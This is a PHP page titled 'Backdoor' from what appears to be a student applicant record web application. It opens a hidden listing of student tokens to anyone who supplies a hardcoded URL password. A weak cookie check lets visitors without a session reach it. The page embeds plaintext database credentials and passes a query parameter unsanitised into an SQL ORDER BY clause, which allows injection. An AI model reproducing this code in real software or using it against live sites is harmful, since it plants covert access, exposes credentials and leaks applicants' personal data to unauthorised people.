<?php
	session_start();
	if(!isset($_SESSION['myusername']))
	{
		if(!isset($_COOKIE['uac']))
		{
			$redirect = "http://".$_SERVER['SERVER_NAME']."/index.php";
			header("location: $redirect");
			exit();
		}	
	}else if(isset($_SESSION['myusername']))
	{
		if (!($_COOKIE['uac']=="q6aN3MUuQZS3QZyoM31ytT8W"))
		{
			$redirect = "http://".$_SERVER['SERVER_NAME']."/main.php";
			header("location: $redirect");
			exit();
		}	
	}
	require '../functions.php';
	approver($_SESSION['myusername']);
?>
<!DOCTYPE HTML>
<html>
<head>
<title>Backdoor</title>
<style>
body {
font-family: "Courier New";
background: black;

}
th {
font-family: "Courier New";
color: #0FFF00;
}
tr{
font-family: "Courier New";
color: #0FFF00;
}
h1 {
font-family: "Courier New";
color: #0FFF00;
}
</style>
</head>
<body>
<?php 
if($_GET['p'] == "dMiRNyPHlRSvJrj")
{	
	$host="localhost";  
	$username="user3";  
	$password="Fr*x+chAsT5SpUY2*Ac6ep#A";
	$db_name="applicant_record";
	$tbl="token";

	$con = mysqli_connect("$host", "$username", "$password")or die("cannot connect"); 
	mysqli_select_db($con, "$db_name")or die("cannot select DB");
	if(isset($_GET['o']))
	{
		$order= $_GET['o'];
	}
	else
	{
		$order = 'ApplicationNumber';
	}
	$result = mysqli_query($con,"SELECT * FROM $tbl ORDER BY $order");
	echo"<h1>STUDENT TOKENS</h1>";
	echo "<table border='0'>
	<tr>
	<th>pid</th>
	<th>ApplicationNumber</th>
	<th>bench</th>
	<th>token</th>
	<th>Time</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['pid'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['bench'] . "</td>";
	  echo "<td align='center'>" . $row['token'] . "</td>";
	  echo "<td align='center'>" . $row['time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";

	mysqli_close($con);
}
else if(!(isset($_GET['p'])))
	{
		echo "<h1>INVALID PASSWORD ACCESS UNAUTHORISED!</h1>";
	}
else if($_GET['p'] != "dMiRNyPHlRSvJrj")
	{
		echo "<h1>INVALID PASSWORD ACCESS UNAUTHORISED!</h1>";
	}
?>
<input action="action" type="button" value="Back" onclick="window.history.go(-1); return false;" />
</body>
</html>
